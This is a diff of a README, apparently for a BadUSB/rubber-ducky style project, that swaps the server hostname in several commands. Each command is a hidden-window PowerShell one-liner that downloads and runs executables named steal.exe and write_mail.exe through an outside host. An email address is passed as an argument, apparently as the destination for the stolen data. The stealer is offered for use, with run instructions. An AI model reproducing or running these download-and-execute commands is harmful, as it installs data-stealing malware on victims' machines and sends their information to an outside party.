@@ -264,9 +264,9 @@ python build.py "steal.py"
 
 ### run
 download from this repo
-(executes script at [`https://vercelutilsserver.totallysafe.ch/exe2ps1?url=https://raw.githubusercontent.com/kaliiiiiiiiii/PublicDuckyChallenger/master/dist/steal.exe&arg=example@example.com`](https://vercelutilsserver.totallysafe.ch/exe2ps1?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkaliiiiiiiiii%2FPublicDuckyChallenger%2Fmaster%2Fdist%2Fsteal.exe&arg=example%40example.com))
+(executes script at [`https://vercelutilsserver.gymthun.com/exe2ps1?url=https://raw.githubusercontent.com/kaliiiiiiiiii/PublicDuckyChallenger/master/dist/steal.exe&arg=example@example.com`](https://vercelutilsserver.gymthun.com/exe2ps1?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkaliiiiiiiiii%2FPublicDuckyChallenger%2Fmaster%2Fdist%2Fsteal.exe&arg=example%40example.com))
 ```shell
-powershell -w h "IEX(iwr('https://vercelutilsserver.totallysafe.ch/exehid?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkaliiiiiiiiii%2FPublicDuckyChallenger%2Fmaster%2Fdist%2Fsteal.exe&arg=example%40example.com'))"
+powershell -w h "IEX(iwr('https://vercelutilsserver.gymthun.com/exehid?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkaliiiiiiiiii%2FPublicDuckyChallenger%2Fmaster%2Fdist%2Fsteal.exe&arg=example%40example.com'))"
 ```
 or execute the exe
 ```shell
@@ -292,7 +292,7 @@ python steal.py -h
 ### Build write Mail
 set up is similar to the other build
 ```shell
-powershell -w h "IEX(iwr('https://vercelutilsserver.totallysafe.ch/exehid?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkaliiiiiiiiii%2FPublicDuckyChallenger%2Fmaster%2Fdist%2Fwrite_mail.exe&arg=example%40example.com'))"
+powershell -w h "IEX(iwr('https://vercelutilsserver.gymthun.com/exehid?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkaliiiiiiiiii%2FPublicDuckyChallenger%2Fmaster%2Fdist%2Fwrite_mail.exe&arg=example%40example.com'))"
 ```
 
 ## Acknowledgments
